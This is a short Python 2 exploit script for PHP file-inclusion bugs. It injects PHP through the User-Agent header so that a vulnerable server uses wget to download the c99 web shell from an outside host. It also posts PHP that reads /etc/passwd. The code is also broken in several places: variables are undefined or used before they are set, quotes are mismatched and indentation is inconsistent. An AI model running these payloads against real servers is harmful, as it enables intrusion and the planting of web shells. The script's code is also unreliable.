#!/usr/bin/python

#--------------------------------#
# Title:  Quick PoC for RFI Bugs #
# Author: Rob Fitzpatrick        #
# TBD:  phpinfo, other methods   #
#--------------------------------#
import urllib2, sys, webbrowser, requests

target = sys.argv[1]

def procself(target):
    try:
		payload = '/proc/self/environ'
		request = urllib2.Request(target+payload)
		request.add_header('User-Agent', '<?system("wget http://www.sh3ll.org/c99.txt -O shell.php");?>')
		response = urllib2.urlopen(request).read()
		if "root" in response:
				print "\n[+] Might of worked...%s"
				webbrowser.open(target+"shell.php")
	except Exception, e:
        print "\n[-] Not looking good...%s" % str(hostname)
        return False

def phpinput(target):
    try:
		payload = 'php://input'
		request = urllib2.Request(target+payload, post)
		post = ' <? system('cat /etc/passwd'); ?>'
		response = urllib2.urlopen(request).read()
		if "shell" in response:
				print "\n[+] Might of worked..."
				webbrowser.open(request)
	except Exception, e:
        print "\n[-] Nothing from php://input..." % str(hostname)
        return False

for t in target:
	procself(target)
	phpinput(target)
		

